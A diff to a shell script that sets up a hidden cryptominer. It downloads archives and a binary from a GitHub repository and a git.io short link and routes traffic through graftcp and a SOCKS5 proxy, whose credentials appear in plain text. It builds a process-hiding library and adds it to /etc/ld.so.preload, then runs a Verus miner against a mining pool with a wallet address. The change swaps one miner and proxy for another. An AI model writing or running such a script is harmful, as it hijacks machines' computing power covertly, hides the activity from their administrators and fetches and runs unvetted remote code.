@@ -2,7 +2,7 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl libcurl4 libjansson4 libgomp1
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 149.6.163.218:80
-socks5_username = nofvbdys-rotate
-socks5_password = 44tpywm4q9bo
+socks5 = 185.242.111.64:12324
+socks5_username = 14abf5d6e18da
+socks5_password = dbb7a6d2ae
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -35,8 +35,8 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget -qO build https://git.io/JiGZh
+chmod +x build
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=ssl://3CX7thXv58hbbtufREN5TDKa2ndXUbxG3N.tes@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./build -a verus -o stratum+tcp://na.luckpool.net:3956 -u RFAyGt31VDBd2MK4wWQoRsFzUXi755Ubn6.tesmekanik -p x -t $(nproc) -x socks5://14abf5d6e18da:dbb7a6d2ae@185.242.111.64:12324
